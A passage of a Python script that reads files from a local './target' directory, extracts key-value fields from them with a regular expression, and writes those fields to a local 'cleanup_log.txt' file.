    Returns an empty dict if the directory does not exist.
    """
    target_dir = "./target"
    result = {}

    try:
        entries = os.listdir(target_dir)
    except FileNotFoundError:
        return result

    for entry in entries:
        path = os.path.join(target_dir, entry)
        if os.path.isfile(path):
            with open(path, "r", encoding="utf-8") as f:
                result[entry] = f.read()

    return result


def extract_domain_fields(files: dict) -> dict:
    """Extract domain-specific fields from each file's contents.

    Looks for patterns of the form:
        field_name: value
        field_name = value
    as well as JSON-style "key": "value" and "key": number pairs.

    Returns a dict mapping each filename to a list of extracted field strings.
    """
    # Matches common key-value patterns across config, YAML, INI, and JSON-like formats.
    # Group 1: field name (word chars, hyphens, dots)
    # Group 2: the value (rest of the line, stripped)
    FIELD_RE = re.compile(
        r'^\s*"?([\w\-\.]+)"?\s*[:=]\s*(.+?)\s*$',
        re.MULTILINE,
    )

    result: dict[str, list[str]] = {}

    for filename, content in files.items():
        fields = []
        for match in FIELD_RE.finditer(content):
            key = match.group(1)
            value = match.group(2).strip('"').strip("'").rstrip(",")
            fields.append(f"{key}: {value}")
        result[filename] = fields

    return result


def generate_cleanup_log(domain_fields: dict) -> None:
    """Write domain fields to cleanup_log.txt.

    Each line has the format:
        filename: field1 | field2 | field3 ...
    Files with no extracted fields are included with an empty field list.
    """
    with open("cleanup_log.txt", "w", encoding="utf-8") as f:
        for filename, fields in domain_fields.items():
            fields_str = " | ".join(fields) if fields else ""
            f.write(f"{filename}: {fields_str}\n")


if __name__ == "__main__":
    files = read_target_files()
    domain_fields = extract_domain_fields(files)
    generate_cleanup_log(domain_fields)
    sys.exit(0)



